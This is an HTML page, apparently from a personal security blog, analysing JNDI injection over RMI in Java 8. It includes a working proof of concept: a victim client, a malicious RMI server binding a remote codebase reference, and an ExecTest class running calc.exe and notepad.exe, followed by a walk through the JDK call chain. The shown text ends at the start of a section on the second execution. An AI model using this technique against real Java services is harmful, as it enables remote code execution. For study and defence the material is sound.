@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="aesm1p">
+
+
+
+    <meta name="description" content="相逢意气为君饮">
+
+
+
+<title>JNDI注入分析-RMI注入 | aesm1p&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/a.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aesm1p&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aesm1p&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">JNDI注入分析-RMI注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">aesm1p</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 2, 2022&nbsp;&nbsp;21:26:12</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>Java命名和目录接口（Java Naming and Directory Interface）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。这些对象可以存储在lDAP，DNS，或者RMI中</p>
+<p>代码格式如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>JNDI注入就是当jndiname变量可控时导致远程class文件被加载，进而导致远程代码执行<br>当前环境java8u121</p>
+<p>Client.java程序(受害者)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.jndiInjection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/aa&quot;</span>;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Server.java（服务器端）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.jndiInjection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(aa);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/aa&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;aa&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ExecTest.java(命令执行的类)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package org.joychou.jndiInjection;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException&#123;</span><br><span class="line">        String cmd=<span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="type">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span> (<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                <span class="type">Reader</span> <span class="variable">reader</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(input);</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(reader);</span><br><span class="line">                <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译ExecTest.java，并开启http服务，然后开启Server.java，然后运行Client.java<br><img src="https://s2.loli.net/2022/11/02/q7tVFkChR3ZdaI4.png" alt="image.png"><br>可以看到成功触发命令执行</p>
+<h1 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InitialContext.java</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br><span class="line">getURLOrDefaultInitCtx函数，这个类会根据输入的name寻找合适的URL context，根据我们输入的变量中会返回</span><br><span class="line">rmiURLContext对象（继承自GenericURLContext类）</span><br><span class="line"><span class="keyword">protected</span> Context <span class="title function_">getURLOrDefaultInitCtx</span><span class="params">(String name)</span></span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">scheme</span> <span class="operator">=</span> getURLScheme(name);</span><br><span class="line">    <span class="keyword">if</span> (scheme != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> NamingManager.getURLContext(scheme, myProps);</span><br><span class="line">        <span class="keyword">if</span> (ctx != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ctx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在返回rmiURLContext对象之后会继而调用该对象的lookup方法，该方法对rmi地址进行解析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//GenericURLContext.java</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">ResolveResult</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.getRootURLContext(var1, <span class="built_in">this</span>.myEnv);<span class="comment">//对rmi地址进行解析</span></span><br><span class="line">    <span class="type">Context</span> <span class="variable">var3</span> <span class="operator">=</span> (Context)var2.getResolvedObj();<span class="comment">// 返回注册上下文RegistryContext</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName()); <span class="comment">//调用注册上下文lookup函数查找aa对象</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>RegistryContext.java中的lookup在注册器中函数寻找aa对象对应的引用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RegistryContext.java</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));<span class="comment">//查找aa对应的远程引用ReferenceWrapper</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>)); <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>decodeObject方法找到我们要生成的远程对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RegistryContext.java</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;<span class="comment">//var1:ReferenceWrapper, var2: aa</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//这里会判断我们的var1是否是remoteReference，如果是的话会进入getReference(),与服务器进行一次连接</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            var8 = (Reference)var3;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//java更新的一项安全机制，需要将com.sun.jndi.rmi.object.trustURLCodebase设置为true</span></span><br><span class="line">        <span class="keyword">if</span> (var8 != <span class="literal">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="literal">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);<span class="comment">//该函数根据输入的对象和环境信息生成指定的对象</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>到此已经通过远程请求获取到了aa对应的ExecTest类，接下来是进行实例化从而触发payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NamingManager.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObjectInstance</span><span class="params">(...)</span>&#123;<span class="comment">//在对象工厂检索由引用标识的对象，使用引用的工厂类名和工厂代码库加载到工厂的类中。</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">    <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">        factory = getObjectFactoryFromReference(ref, f);<span class="comment">//命令执行点</span></span><br><span class="line">        <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                             environment);</span><br><span class="line">        &#125;</span><br><span class="line">getObjectFactoryFromReference函数通过引用将对象进行实例化</span><br><span class="line"><span class="comment">//NamingManager.java</span></span><br><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">    InstantiationException,</span><br><span class="line">    MalformedURLException &#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);<span class="comment">//在本地classpath中寻找class，代码会进入此分支</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//加载远程codebase，就是我们定义的恶意RMI服务器</span></span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例化恶意的class文件</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>小缺陷</strong><br>这段payload虽然能正常运行，但在运行时会报错，我们来尝试修改代码修复其错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; javax.naming.NamingException [Root exception is java.lang.ClassCastException: ExecTest cannot be cast to javax.naming.spi.ObjectFactory</span><br></pre></td></tr></table></figure>
+<p>这个报错的触发原因是我们实例化的ExecTest类无法被转换为ObjectFactory类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NamingManager.java</span></span><br><span class="line"><span class="comment">//实例化恶意的class文件</span></span><br><span class="line"><span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;<span class="comment">//执行该语句时进行类型强制转换报错</span></span><br></pre></td></tr></table></figure>
+<p>所以我们这里将我们的恶意类重写为继承自ObjectFactory的类即可，新版payload如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package org.joychou.jndiInjection;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecTest</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                                    Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实际上我们只需要在上述的两个函数中任意一个写入命令即可，上文所写的两个命令都会被执行。为什么会执行两次呢？<br><em><strong>第一次执行</strong></em></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NamingManager.java</span></span><br><span class="line"><span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+<p>在调用newInstance方法实例化ExecTest类的时候会默认调用ExecTest类的无参构造方法，相当于new Exectest()，所以无参构造函数中的命令会被执行。<br><em><strong>第二次执行</strong></em></p>
